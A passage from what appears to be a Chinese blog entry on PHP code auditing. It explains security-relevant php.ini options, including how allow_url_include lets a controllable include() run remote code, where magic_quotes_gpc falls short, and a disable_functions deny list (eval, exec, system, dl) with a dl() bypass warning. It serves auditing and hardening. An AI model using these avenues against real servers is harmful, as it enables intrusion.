align="center">该配置选项可在<code>php.ini</code>、<code>.htaccess</code>或<code>httpd.conf</code>中设置</td></tr><tr><td align="center"><strong>PHP_INI_SYSTEM</strong></td><td align="center">该配置选项可在<code>php.ini</code>或<code>httpd.conf</code>中配置</td></tr><tr><td align="center"><strong>PHP_INI_ALL</strong></td><td align="center">该配置选项可在任何地方设置</td></tr><tr><td align="center"><strong>php.ini.only</strong></td><td align="center">该配置选项可仅可在php.ini中配置</td></tr></tbody></table><h4 id="常见核心配置"><a href="#常见核心配置" class="headerlink" title="常见核心配置"></a><strong>常见核心配置</strong></h4><p><font size='4' color='red'>register_globals(全局变量注册开关)</font></p><blockquote><p>版本：&lt;= <code>PHP 5.3.0</code></p></blockquote><p>在选项设置为on的情况下，会直接吧用户GET、POST等方式提交上来的参数注册成全局变量并初始化值为参数对应的值，使得提交的参数可以直接在脚本中使用</p><p><font size='4' color='red'>allow_url_include(是否允许包含远程文件)</font></p><blockquote><p>版本：<code>PHP all</code>    PHP 5.2.0之后默认为Off</p><p>类似函数：<code>allow_url_fopen(是否打开远程文件)</code></p></blockquote><p>在该配置为on的情况下，它可以直接远程包含文件，当存在<code>include($var)</code>并且<code>$var</code>可控的情况下，可以直接控制其来执行PHP代码</p><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217095516607.png" alt="image-20201217095516607"></p><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217100014708.png" alt="image-20201217100014708"></p><p><font size='4' color='red'>magic_quotes_gpc(魔术引号自动过滤)</font></p><blockquote><p>版本：<code>&lt; PHP 5.4</code>；    <code>PHP 5.3</code>之后不推荐使用该函数</p><p>置返回： <code>&lt; PHP 4.2.3</code>配置范围为PHP_INI_ALL；<code>&gt; PHP 4.2.3</code>配置范围为PHP_INI_PERDIR</p></blockquote><p>当选项为On时，在不存在编码或者其他绕过绕过的情况下，可以使得很多漏洞无法利用，他会自动在GET、POST、COOKIE变量中的单引号<code>&#39;&#39;</code>、双引号<code>&quot;&quot;</code>、反斜杠<code>\</code>以及空字符<code>NULL</code>的前面加上反斜杠</p><p>在<code>PHP5</code>中<code>magic_quotes_gpc</code>不会过滤<code>$_SERVER</code>变量，导致很多client-ip、referer一类的漏洞能够利用。</p><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217102901642.png" alt="image-20201217102901642"></p><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217103333525.png" alt="image-20201217103333525"></p><p><font size='4' color='red'>open_basedir(PHP可访问目录)</font></p><blockquote><p>版本：PHP ALL</p><p>范围：<code>&lt; PHP 5.2.3</code>配置范围为PHP_INI_SYSTEM；<code>&gt; PHP 5.2.3</code>配置范围PHP_INI_ALL</p></blockquote><p><code>open_basedir</code>指令用来限制PHP只能访问哪些目录，通常只需要设置Web文件目录即可，如果需要加载其他外部脚本，也需要吧脚本所在的目录路径加入到<code>open_basedir</code>指令中，多个目录用分号(<code>;</code>)分隔</p><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment"># `open_basedir`指定的实际上时前缀，而不是目录名</span>open_basedir<span class="token operator">=</span><span class="token operator">/</span>www<span class="token operator">/</span>a        <span class="token shell-comment comment"># 设定可访问的目录为/www下以a开头的文件，也就是说/www/a和/www/ab都可以被访问</span>open_basedir<span class="token operator">=</span><span class="token operator">/</span>www<span class="token operator">/</span>a<span class="token operator">/</span><span class="token shell-comment comment"># 设置只能访问/www/a文件</span></code></pre><p>当<code>open_basedir</code>配置目录后，执行脚本访问其他函数都需要验证文件是否符合配置要求，因此会影响效率</p><p><font size='4' color='red'>disable_functions(禁用函数)</font></p><blockquote><p>版本：PHP ALL</p><p>范围：该指令的配置范围为<code>php.ini only</code></p></blockquote><p>在正式生产环境中，为了更安全地允许PHP，也可以使用<code>disable_functions</code>指令来禁止一些敏感函数的使用。当你使用该指令禁用危险函数时，切记将<code>dl()</code>函数加到禁止列表中，因为攻击者可以利用<code>dl()</code>函数来加载自定义的PHP扩展以突破<code>disable_functions</code>的限定</p><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment"># 多个函数之间用逗号（,）分隔</span>disable_functions<span class="token operator">=</span>phpinfo<span class="token punctuation">,</span>eval<span class="token punctuation">,</span>passthru<span class="token punctuation">,</span>exec<span class="token punctuation">,</span>system<span class="token punctuation">,</span>dl</code></pre><p><font size='4' color='red'>disable_errors和error_reporting(错误显示)</font></p><blockquote><p>版本：PHP ALL</p><p>配置范围：PHP_INI_ALL</p></blockquote><p><code>disable_errors</code>表明是否显示PHP脚本内部的错误，在调试时通常将PHP错误显示打开，但是在生产环境中，建议关闭PHP错误回显。</p><p>为了避免一些安全隐患，在设置<code>disable_errors=On</code>时，还可以配置<code>error_reporting</code>，这个选项用来配置错误显示的级别，可使用数字也可使用内置常量配置。</p><p>​                                                                <strong>数字格式与变量格式的详细信息</strong></p><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217152415931.png" alt="image-20201217152415931"></p><p>​                                                                             <strong>常用指令及说明</strong></p><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217154018469.png" alt="image-20201217154018469"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
